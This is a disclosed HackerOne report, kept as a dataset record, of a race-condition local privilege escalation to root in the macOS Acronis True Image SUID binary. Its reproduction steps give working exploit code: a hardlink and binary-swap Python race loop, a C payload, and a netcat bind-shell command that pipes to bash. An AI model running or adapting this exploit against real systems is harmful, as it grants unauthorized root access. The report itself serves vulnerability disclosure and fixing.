---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1251464'
original_report_id: '1251464'
title: Acronis True Image Local Privilege Escalation Due To Race Condition In Application
  Verification
weakness: Privilege Escalation
team_handle: acronis
created_at: '2021-07-05T03:49:58.205Z'
disclosed_at: '2022-07-28T10:32:00.943Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
asset_identifier: Acronis Cyber Protect Home Office (formerly Acronis True Image)
asset_type: DOWNLOADABLE_EXECUTABLES
max_severity: critical
tags:
- hackerone
- privilege-escalation
---

# Acronis True Image Local Privilege Escalation Due To Race Condition In Application Verification

## Metadata

- HackerOne Report ID: 1251464
- Weakness: Privilege Escalation
- Program: acronis
- Disclosed At: 2022-07-28T10:32:00.943Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary
The Acronis True Image application has a SUID binary "Acronis True Image" that starts another binary "console" in the same directory. The SUID binary does some checks on "console" before it is run to make sure the correct binary is being run. By using a hardlink to the SUID binary we can coerice it to try and load "console" in a chosen directory we can write to. From this point we can exploit that the SUID binary does not lock "console" whilst it checks if it is valid, we setup a environment where we can replace console at will and try to win a race where we replace the "console" binary **after** it has been checked but **before** it has been run. If we win this race we gain code execution as root from an admin account. 

## Steps To Reproduce
first we make the shell command to run 
```bash
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell 
```
now lets make the c program that will run this shell command naming it test.c
```c
#include <stdlib.h>
int main() 
{
	system("touch pass;bash shell");
	return 0;
}
```
compile the program
```bash
gcc test.c 
```
run the following python program
```python
import os 
import time 

os.link("/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image", "./run")
os.link("/Applications/Acronis True Image.app/Contents/MacOS/console", "./console")

lag = 0.01 
while True: 
	os.popen("./run")
	time.sleep(lag)
	os.unlink("./console")
	os.link("./a.out", "./console")
	time.sleep(1.0)
	os.unlink("./console")
	os.link("Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
	lag += 0.01 
	if os.path.exists("./pass"):
		exit()
```
connect to the root shell
```bash
nc 127.0.0.1 8080
```
## Recommendations
Any binaries that are checked for validity should be locked so that they can not be replaced during validation. Additionally if possible the application should verify where it is being run from to try and prevent further symlink attacks.

## Impact

Local privilege escalation to root.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
